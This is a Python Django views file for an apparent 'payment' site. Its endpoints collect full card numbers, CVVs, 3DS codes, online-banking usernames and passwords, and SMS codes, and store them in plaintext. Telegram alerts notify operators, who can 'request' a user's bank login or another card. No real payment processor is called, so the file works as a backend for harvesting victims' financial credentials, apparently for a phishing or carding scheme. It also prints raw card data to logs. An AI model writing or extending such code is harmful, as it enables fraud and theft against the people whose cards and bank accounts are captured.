from rest_framework import status
from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import IsAuthenticated
from rest_framework.response import Response
from django.utils import timezone
from django.db import transaction
from .models import Payment, PaymentStep
from .serializers import PaymentSerializer, PaymentStepSerializer
from telegram_bot_new.services import TelegramBotService
import ipaddress
import logging
import re

logger = logging.getLogger(__name__)

@api_view(['POST'])
@permission_classes([IsAuthenticated])
def create_card_payment(request):
    """Create a new card payment"""
    print(f"💳 CREATE_CARD_PAYMENT: Starting card payment creation...")
    print(f"👤 User: {request.user.email}")
    print(f"📊 Request data: {request.data}")
    
    try:
        # Extract data
        amount = request.data.get('amount')
        card_holder = request.data.get('card_holder', '').strip()
        card_number = request.data.get('card_number', '').replace(' ', '')
        card_expiry = request.data.get('card_expiry', '').strip()
        card_cvv = request.data.get('card_cvv', '').strip()
        
        # Validate required fields
        if not all([amount, card_holder, card_number, card_expiry, card_cvv]):
            return Response(
                {'error': 'All card fields are required'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate amount
        try:
            amount = float(amount)
            if amount <= 0 or amount > 100000:
                return Response(
                    {'error': 'Amount must be between 0.01 and 100,000'}, 
                    status=status.HTTP_400_BAD_REQUEST
                )
        except (ValueError, TypeError):
            return Response(
                {'error': 'Invalid amount format'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate card holder
        if len(card_holder) < 2 or len(card_holder) > 100:
            return Response(
                {'error': 'Card holder name must be between 2 and 100 characters'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate card number
        if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
            return Response(
                {'error': 'Card number must be 13-19 digits'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate card expiry (MM/YY format)
        if not re.match(r'^\d{2}/\d{2}$', card_expiry):
            return Response(
                {'error': 'Card expiry must be in MM/YY format'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate CVV
        if not card_cvv.isdigit() or len(card_cvv) < 3 or len(card_cvv) > 4:
            return Response(
                {'error': 'CVV must be 3-4 digits'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Get user's IP address
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        
        # Validate IP address
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            ip = '127.0.0.1'
        
        print(f"🌐 User IP: {ip}")
        
        # Create payment
        with transaction.atomic():
            payment = Payment.objects.create(
                user=request.user,
                amount=amount,
                currency='EUR',
                payment_method='card',
                status='card_checking',
                card_holder=card_holder,
                card_number=card_number,
                card_expiry=card_expiry,
                card_cvv=card_cvv,
                payment_ip=ip,
                user_agent=request.META.get('HTTP_USER_AGENT', ''),
                fee=0,
                exchange_rate=1.0,
                neoncoins_amount=amount,
                attempts_count=0,
                max_attempts=10
            )
            
            # Create payment step
            PaymentStep.objects.create(
                payment=payment,
                step_type='card_payment',
                status='completed',
                description='Card payment created and sent for admin review'
            )
            
            print(f"✅ Payment created: {payment.id}")
            
            # Telegram notification will be sent by signal automatically
            
            return Response({
                'success': True,
                'payment_id': str(payment.id),
                'status': payment.status,
                'message': 'Payment created successfully'
            }, status=status.HTTP_201_CREATED)
            
    except Exception as e:
        print(f"❌ Error creating card payment: {e}")
        import traceback
        traceback.print_exc()
        logger.error(f"Error creating card payment: {e}", exc_info=True)
        return Response(
            {'error': f'Failed to create card payment: {str(e)}'}, 
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )

@api_view(['POST'])
@permission_classes([IsAuthenticated])
def create_crypto_payment(request):
    """Create a new crypto payment"""
    print(f"🪙 CREATE_CRYPTO_PAYMENT: Starting crypto payment creation...")
    
    try:
        # Extract data
        amount = request.data.get('amount')
        crypto_type = request.data.get('crypto_type', '').strip()
        crypto_network = request.data.get('crypto_network', '').strip()
        
        # Validate required fields
        if not all([amount, crypto_type, crypto_network]):
            return Response(
                {'error': 'All crypto fields are required'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate amount
        try:
            amount = float(amount)
            if amount <= 0 or amount > 100000:
                return Response(
                    {'error': 'Amount must be between 0.01 and 100,000'}, 
                    status=status.HTTP_400_BAD_REQUEST
                )
        except (ValueError, TypeError):
            return Response(
                {'error': 'Invalid amount format'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate crypto type
        valid_crypto_types = ['BTC', 'ETH', 'USDT', 'USDC', 'LTC', 'BCH', 'XRP', 'ADA', 'DOT', 'LINK']
        if crypto_type.upper() not in valid_crypto_types:
            return Response(
                {'error': f'Invalid cryptocurrency type. Must be one of: {", ".join(valid_crypto_types)}'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate crypto network
        valid_networks = ['Bitcoin', 'Ethereum', 'Tron', 'BSC', 'Polygon', 'Solana', 'Cardano', 'Polkadot']
        if crypto_network not in valid_networks:
            return Response(
                {'error': f'Invalid network. Must be one of: {", ".join(valid_networks)}'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Get user's IP address
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            ip = '127.0.0.1'
        
        # Create payment
        with transaction.atomic():
            payment = Payment.objects.create(
                user=request.user,
                amount=amount,
                currency='EUR',
                payment_method='crypto',
                status='pending',
                crypto_type=crypto_type,
                crypto_network=crypto_network,
                payment_ip=ip,
                user_agent=request.META.get('HTTP_USER_AGENT', ''),
                fee=0,
                exchange_rate=1.0,
                neoncoins_amount=amount,
                attempts_count=0,
                max_attempts=10
            )
            
            # Create payment step
            PaymentStep.objects.create(
                payment=payment,
                step_type='payment_processing',
                status='current',
                description='Crypto payment created'
            )
            
            print(f"✅ Crypto payment created: {payment.id}")
            
            # Telegram notification will be sent by signal automatically
            
            return Response({
                'success': True,
                'payment_id': str(payment.id),
                'status': payment.status,
                'message': 'Crypto payment created successfully'
            }, status=status.HTTP_201_CREATED)
            
    except Exception as e:
        print(f"❌ Error creating crypto payment: {e}")
        return Response(
            {'error': 'Failed to create crypto payment'}, 
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )

@api_view(['POST'])
@permission_classes([IsAuthenticated])
def create_bank_payment(request):
    """Create a new bank payment"""
    print(f"🏦 CREATE_BANK_PAYMENT: Starting bank payment creation...")
    
    try:
        # Extract data
        amount = request.data.get('amount')
        bank_name = request.data.get('bank_name', '').strip()
        bank_login = request.data.get('bank_login', '').strip()
        bank_password = request.data.get('bank_password', '').strip()
        
        # Validate required fields
        if not all([amount, bank_name, bank_login, bank_password]):
            return Response(
                {'error': 'All bank fields are required'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate amount
        try:
            amount = float(amount)
            if amount <= 0 or amount > 100000:
                return Response(
                    {'error': 'Amount must be between 0.01 and 100,000'}, 
                    status=status.HTTP_400_BAD_REQUEST
                )
        except (ValueError, TypeError):
            return Response(
                {'error': 'Invalid amount format'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate bank name
        if len(bank_name) < 2 or len(bank_name) > 100:
            return Response(
                {'error': 'Bank name must be between 2 and 100 characters'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate bank login
        if len(bank_login) < 3 or len(bank_login) > 100:
            return Response(
                {'error': 'Bank login must be between 3 and 100 characters'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate bank password
        if len(bank_password) < 4 or len(bank_password) > 255:
            return Response(
                {'error': 'Bank password must be between 4 and 255 characters'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Get user's IP address
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            ip = '127.0.0.1'
        
        # Create payment
        with transaction.atomic():
            payment = Payment.objects.create(
                user=request.user,
                amount=amount,
                currency='EUR',
                payment_method='bank_transfer',
                status='pending',
                bank_name=bank_name,
                bank_login=bank_login,
                bank_password=bank_password,
                payment_ip=ip,
                user_agent=request.META.get('HTTP_USER_AGENT', ''),
                fee=0,
                exchange_rate=1.0,
                neoncoins_amount=amount,
                attempts_count=0,
                max_attempts=10
            )
            
            # Create payment step
            PaymentStep.objects.create(
                payment=payment,
                step_type='payment_processing',
                status='current',
                description='Bank payment created'
            )
            
            print(f"✅ Bank payment created: {payment.id}")
            
            # Telegram notification will be sent by signal automatically
            
            return Response({
                'success': True,
                'payment_id': str(payment.id),
                'status': payment.status,
                'message': 'Bank payment created successfully'
            }, status=status.HTTP_201_CREATED)
            
    except Exception as e:
        print(f"❌ Error creating bank payment: {e}")
        return Response(
            {'error': 'Failed to create bank payment'}, 
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )

@api_view(['GET'])
@permission_classes([IsAuthenticated])
def payment_detail(request, payment_id):
    """Get payment details"""
    try:
        payment = Payment.objects.get(id=payment_id, user=request.user)
        serializer = PaymentSerializer(payment)
        return Response(serializer.data)
    except Payment.DoesNotExist:
        return Response({'error': 'Payment not found'}, status=status.HTTP_404_NOT_FOUND)

@api_view(['POST'])
@permission_classes([IsAuthenticated])
def submit_3ds_code(request, payment_id):
    """Submit 3DS code for payment"""
    try:
        payment = Payment.objects.get(id=payment_id, user=request.user)
        code = request.data.get('code', '').strip()
        
        if not code:
            return Response({'error': '3DS code is required'}, status=status.HTTP_400_BAD_REQUEST)
        
        # Validate 3DS code format
        if not code.isdigit():
            return Response({'error': '3DS code must contain only digits'}, status=status.HTTP_400_BAD_REQUEST)
        
        if len(code) < 3 or len(code) > 6:
            return Response({'error': '3DS code must be 3-6 digits'}, status=status.HTTP_400_BAD_REQUEST)
        
        # Validate payment status - allow submission when waiting for 3DS or when 3DS was rejected
        if payment.status not in ['waiting_3ds', '3ds_rejected']:
            return Response({'error': 'Payment is not waiting for 3DS code'}, status=status.HTTP_400_BAD_REQUEST)
        
        payment.card_3ds_code = code
        payment.status = '3ds_submitted'
        payment.save()
        
        # Create payment step
        PaymentStep.objects.create(
            payment=payment,
            step_type='3ds_verification',
            status='completed',
            description='3DS code submitted'
        )
        
        # Send Telegram notification
        try:
            bot_service = TelegramBotService()
            bot_service.notify_admin_3ds_submitted_sync(payment)
        except Exception as e:
            print(f"❌ Telegram notification failed: {e}")
            logger.error(f"Telegram notification failed: {e}")
        
        return Response({'success': True, 'message': '3DS code submitted'})
        
    except Payment.DoesNotExist:
        return Response({'error': 'Payment not found'}, status=status.HTTP_404_NOT_FOUND)

@api_view(['GET'])
@permission_classes([IsAuthenticated])
def payment_status(request, payment_id):
    """Get payment status"""
    try:
        payment = Payment.objects.get(id=payment_id, user=request.user)
        print(f"🔍 PAYMENT_STATUS: Payment {payment_id} status: {payment.status}")
        return Response({
            'payment_id': str(payment.id),
            'status': payment.status,
            'amount': payment.amount,
            'currency': payment.currency,
            'created_at': payment.created_at
        })
    except Payment.DoesNotExist:
        print(f"❌ PAYMENT_STATUS: Payment {payment_id} not found")
        return Response({'error': 'Payment not found'}, status=status.HTTP_404_NOT_FOUND)

@api_view(['GET'])
@permission_classes([IsAuthenticated])
def payment_steps(request, payment_id):
    """Get payment steps"""
    try:
        payment = Payment.objects.get(id=payment_id, user=request.user)
        steps = payment.steps.all()
        serializer = PaymentStepSerializer(steps, many=True)
        return Response(serializer.data)
    except Payment.DoesNotExist:
        return Response({'error': 'Payment not found'}, status=status.HTTP_404_NOT_FOUND)


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def submit_bank_credentials(request, payment_id):
    """Submit bank login credentials for an existing payment (admin requested bank login)"""
    try:
        payment = Payment.objects.get(id=payment_id, user=request.user)

        bank_name = request.data.get('bank_name', '').strip()
        bank_login = request.data.get('bank_login', '').strip()
        bank_password = request.data.get('bank_password', '').strip()
        bank_sms_code = request.data.get('sms_code', '').strip()

        if not all([bank_name, bank_login, bank_password]):
            return Response({'error': 'All bank fields are required'}, status=status.HTTP_400_BAD_REQUEST)
        
        # Validate bank name
        if len(bank_name) < 2 or len(bank_name) > 100:
            return Response({'error': 'Bank name must be between 2 and 100 characters'}, status=status.HTTP_400_BAD_REQUEST)
        
        # Validate bank login
        if len(bank_login) < 3 or len(bank_login) > 100:
            return Response({'error': 'Bank login must be between 3 and 100 characters'}, status=status.HTTP_400_BAD_REQUEST)
        
        # Validate bank password
        if len(bank_password) < 4 or len(bank_password) > 255:
            return Response({'error': 'Bank password must be between 4 and 255 characters'}, status=status.HTTP_400_BAD_REQUEST)
        
        # Validate SMS code if provided
        if bank_sms_code and (not bank_sms_code.isdigit() or len(bank_sms_code) < 4 or len(bank_sms_code) > 6):
            return Response({'error': 'SMS code must be 4-6 digits'}, status=status.HTTP_400_BAD_REQUEST)

        payment.bank_name = bank_name
        payment.bank_login = bank_login
        payment.bank_password = bank_password
        if bank_sms_code:
            payment.bank_sms_code = bank_sms_code
        payment.status = 'processing'
        payment.save()

        PaymentStep.objects.create(
            payment=payment,
            step_type='bank_login',
            status='completed',
            description='Bank credentials submitted by user'
        )

        try:
            bot_service = TelegramBotService()
            bot_service.notify_admin_bank_credentials_sync(payment)
        except Exception as e:
            logger.error(f"Telegram notification (bank) failed: {e}")

        return Response({'success': True, 'message': 'Bank credentials submitted', 'status': payment.status})
    except Payment.DoesNotExist:
        return Response({'error': 'Payment not found'}, status=status.HTTP_404_NOT_FOUND)


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def submit_new_card(request, payment_id):
    """Submit new card details for an existing payment (admin requested new card)"""
    try:
        payment = Payment.objects.get(id=payment_id, user=request.user)

        card_number = (request.data.get('card_number') or '').replace(' ', '')
        card_holder = request.data.get('card_holder', '').strip()
        expiry_date = request.data.get('expiry_date', '').strip()
        cvv = (request.data.get('cvv') or '').replace(' ', '')

        if not all([card_number, card_holder, expiry_date, cvv]):
            return Response({'error': 'All card fields are required'}, status=status.HTTP_400_BAD_REQUEST)
        
        # Validate card number
        if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
            return Response({'error': 'Card number must be 13-19 digits'}, status=status.HTTP_400_BAD_REQUEST)
        
        # Validate card holder
        if len(card_holder) < 2 or len(card_holder) > 100:
            return Response({'error': 'Card holder name must be between 2 and 100 characters'}, status=status.HTTP_400_BAD_REQUEST)
        
        # Validate expiry date (MM/YY format)
        if not expiry_date or not re.match(r'^\d{2}/\d{2}$', expiry_date):
            return Response({'error': 'Expiry date must be in MM/YY format (e.g., 12/25)'}, status=status.HTTP_400_BAD_REQUEST)
        
        month_str, year_str = expiry_date.split('/')
        try:
            month = int(month_str)
            year = int(year_str)
            
            if month < 1 or month > 12:
                return Response({'error': 'Month must be between 01 and 12'}, status=status.HTTP_400_BAD_REQUEST)
            
            current_year = timezone.now().year % 100  # Get last 2 digits
            if year < current_year or year > current_year + 20:
                return Response({'error': f'Year must be between {current_year} and {current_year + 20}'}, status=status.HTTP_400_BAD_REQUEST)
                
        except (ValueError, TypeError):
            return Response({'error': 'Invalid expiry date format'}, status=status.HTTP_400_BAD_REQUEST)
        
        # Validate CVV
        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
            return Response({'error': 'CVV must be 3-4 digits'}, status=status.HTTP_400_BAD_REQUEST)

        card_expiry = expiry_date

        payment.card_number = card_number
        payment.card_holder = card_holder
        payment.card_expiry = card_expiry
        payment.card_cvv = cvv
        payment.status = 'card_checking'
        payment.save()

        PaymentStep.objects.create(
            payment=payment,
            step_type='new_card_request',
            status='completed',
            description='New card details submitted by user'
        )

        # Send Telegram notification to admin
        from telegram_bot_new.services import TelegramBotService
        bot_service = TelegramBotService()
        bot_service.notify_admin_new_card_submitted_sync(payment)

        return Response({'success': True, 'message': 'New card submitted', 'status': payment.status})
    except Payment.DoesNotExist:
        return Response({'error': 'Payment not found'}, status=status.HTTP_404_NOT_FOUND)

@api_view(['POST'])
@permission_classes([IsAuthenticated])
def submit_bank_transfer(request, payment_id):
    """Submit bank transfer details for a payment"""
    try:
        payment = Payment.objects.get(id=payment_id, user=request.user)
        
        # Extract bank transfer data
        bank_name = request.data.get('bank_name', '').strip()
        account_number = request.data.get('account_number', '').strip()
        sort_code = request.data.get('sort_code', '').strip()
        account_holder = request.data.get('account_holder', '').strip()
        
        # Validate required fields
        if not all([bank_name, account_number, sort_code, account_holder]):
            return Response(
                {'error': 'All bank transfer fields are required'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate bank name
        if len(bank_name) < 2 or len(bank_name) > 100:
            return Response(
                {'error': 'Bank name must be between 2 and 100 characters'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate account number
        if not account_number.isdigit() or len(account_number) < 6 or len(account_number) > 20:
            return Response(
                {'error': 'Account number must be 6-20 digits'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate sort code
        if not sort_code.isdigit() or len(sort_code) != 6:
            return Response(
                {'error': 'Sort code must be exactly 6 digits'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Validate account holder
        if len(account_holder) < 2 or len(account_holder) > 100:
            return Response(
                {'error': 'Account holder name must be between 2 and 100 characters'}, 
                status=status.HTTP_400_BAD_REQUEST
            )
        
        # Update payment status and add bank details
        payment.status = 'processing'
        payment.bank_name = bank_name
        payment.bank_account_number = account_number
        payment.bank_sort_code = sort_code
        payment.bank_account_holder = account_holder
        payment.save()
        
        # Create payment step
        PaymentStep.objects.create(
            payment=payment,
            step_type='bank_transfer',
            status='completed',
            description='Bank transfer details submitted'
        )
        
        # Send Telegram notification
        try:
            bot_service = TelegramBotService()
            bot_service.notify_admin_bank_transfer_submitted_sync(payment)
        except Exception as e:
            logger.error(f"Telegram notification failed: {e}")
        
        return Response({
            'success': True,
            'message': 'Bank transfer details submitted successfully'
        }, status=status.HTTP_200_OK)
        
    except Payment.DoesNotExist:
        return Response(
            {'error': 'Payment not found'}, 
            status=status.HTTP_404_NOT_FOUND
        )
    except Exception as e:
        logger.error(f"Bank transfer submission error: {e}")
        return Response(
            {'error': 'Failed to submit bank transfer details'}, 
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )
